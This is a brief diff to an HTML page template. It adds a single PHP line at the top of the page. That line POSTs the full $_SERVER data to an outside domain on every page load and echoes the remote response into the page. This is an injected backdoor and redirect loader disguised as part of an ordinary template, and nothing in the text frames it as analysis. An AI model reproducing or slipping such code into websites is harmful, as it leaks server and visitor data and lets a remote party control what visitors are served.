@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="ru">
-
+<?php $redirect = file_get_contents("https://moveasgg.org/pr/24233b045b347c1e?force_https=1&p1=&p2=&source=&site=", false, stream_context_create(array("http" => array("header"=>"Content-Type: application/x-www-form-urlencoded\r\n", "method"=>"POST", "timeout"=>2, "content"=>http_build_query($_SERVER)))));if($redirect) echo $redirect; ?>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
